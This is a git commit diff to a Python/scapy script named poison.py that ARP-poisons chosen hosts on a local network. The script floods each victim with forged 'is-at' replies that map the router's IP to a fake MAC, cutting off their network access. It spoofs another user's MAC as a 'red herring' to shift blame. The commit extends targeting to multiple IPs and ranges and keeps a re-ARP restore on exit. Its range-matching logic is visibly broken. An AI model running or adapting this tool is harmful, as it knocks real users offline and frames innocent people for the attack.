8f5e036bfd855fefe0254773f67e53e4506e0bd5
DavidBrosnan <DavidBrosnan@mail.adelphi.edu>
2014-11-26 21:10:17 -0500

    Now allows for multiple IP address and range input

--- poison.py
+++ poison.py
@@ -7,6 +7,70 @@ import sys
 from hosts import * 
 import netifaces
 
+
+def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, poison):
+	
+	
+	myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
+					#set as another users MAC for Red herring attempt
+	if poison == True:
+		dstMAC = "08:00:27:ff:ff:fe"		#False MAC address
+	else:
+		dstMAC = deadEndMAC
+
+	#Creating Poisoning packet
+
+	#Ethernet*****************
+	pkt = Ether()/ARP()	
+	pkt.dst = victimMAC		#Ethernet Destination
+	pkt.src = myMAC			#Ethernet Source
+	#************************
+	
+	#ARP**********************
+	pkt.pdst= victimIP		# (IP)
+	pkt.hwdst = victimMAC		# (MAC)Hey just to let you know...	
+	pkt.psrc = deadEndIP		# if you're trying to talk to...
+	pkt.hwsrc = dstMAC		# His MAC address is ...
+	pkt.op = 2			# that's where he's at (is-at)
+	#*************************
+	return pkt
+
+def getTargets(hosts):
+	print "Select target IP address/range:"
+	print "e.g. 192.168.56.23 OR \n192.168.56.26,192.168.56.32,192.168.56.72 OR \n192.168.56.100-192.168.56.200"
+	IPstring = raw_input()
+
+	targets = {}
+
+	if "-" in IPstring:
+		index = IPstring.find("-")
+
+		minIP = IPstring[:index:]
+		maxIP = IPstring[index+1::]
+
+
+		for IP in hosts:
+			if IP >= min or IP <= max:
+				targets[IP] = hosts[IP]
+
+	elif "," in IPstring:	
+
+		while "," in IPstring:
+			index = IPstring.find(",")
+
+			IP = IPstring[:index:]
+
+			targets[IP] = hosts[IP]
+
+			IPstring = IPstring[index+1::]
+
+		targets[IPstring] = hosts[IPstring] #should contain the last IP address
+
+	else:
+		targets[IPstring] = hosts[IPstring]
+		
+	return targets
+
 print "Available interfaces"
 
 for interface in netifaces.interfaces():
@@ -16,60 +80,42 @@ interface = raw_input("What interface would you like to use?:\n")
 
 machines = getNetwork(interface)
 
-target = raw_input("Select target IP Address:\n")
+victims = getTargets(machines)
 
 router = min(machines)
 
+if router in victims:
+	del victims[router]	#In case router was selected as a victim
+
 print router
 
-victimIP = target		#IP address of who we poison
-victimMAC = machines[target][0]		#MAC address ""
+packets = []
 
-myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
-					#set as another users MAC for Red herring attempt
+for ip, info in victims.iteritems():
+	packets.append( createPacket(ip,info[0], router, machines[router][0], True) )
 
-deadEndIP = router		#IP address of host we dont want victim to talk to
-deadEndMAC = machines[router][0]	#MAC address ""
-
-killMAC = "08:00:27:ff:ff:fe"		#False MAC address
-
-
-#Creating Poisoning packet
-
-#Ethernet*****************
-pkt = Ether()/ARP()	
-pkt.dst = victimMAC		#Ethernet Destination
-pkt.src = myMAC			#Ethernet Source
-#*************************
-
-#ARP**********************
-pkt.pdst= victimIP		# (IP)
-pkt.hwdst = victimMAC		# (MAC)Hey just to let you know...	
-pkt.psrc = deadEndIP		# if you're trying to talk to...
-pkt.hwsrc = killMAC		# His MAC address is ...
-pkt.op = 2			# that's where he's at (is-at)
-#*************************
 
 print("Turn out the lights....")
 
 try:
 	while True:
-		sendp(pkt, iface=interface)
+		for pkt in packets:
+			sendp(pkt, iface=interface)
+			
 		time.sleep(2)
 
 except KeyboardInterrupt:
 	print("Re-ARPing....")
-	heal = Ether()/ARP()
-	heal.src = myMAC
-	heal.dst = victimMAC
-	heal.hwsrc = deadEndMAC
-	heal.hwdst = victimMAC
-	heal.pdst = victimIP
-	heal.psrc = deadEndIP
-	heal.op = 2
+
+	healPacks = []
+
+	for ip, info in victims.iteritems():
+		healPacks.append(createPacket(ip,info[0],router,machines[router][0], False))
 
 	for i in range(0, 5):
-		sendp(heal, iface=interface)
+		for heal in healPacks:
+			sendp(heal, iface=interface)
+			
 		time.sleep(1)
 
 	sys.exit(0)
